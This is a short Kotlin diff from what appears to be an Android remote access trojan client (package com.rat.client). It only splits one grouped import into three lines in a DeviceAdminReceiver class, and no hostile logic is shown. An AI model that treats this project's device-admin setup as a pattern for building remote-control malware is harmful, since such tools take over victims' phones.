@@ -4,7 +4,9 @@ import android.app.admin.DeviceAdminReceiver
 import android.content.Context
 import android.content.Intent
 import android.util.Log
-import com.rat.client.util.{DeviceUtils, PreferencesManager, SystemUtils}
+import com.rat.client.util.DeviceUtils
+import com.rat.client.util.PreferencesManager
+import com.rat.client.util.SystemUtils
 
 class DeviceAdminReceiverImpl : DeviceAdminReceiver() {
 
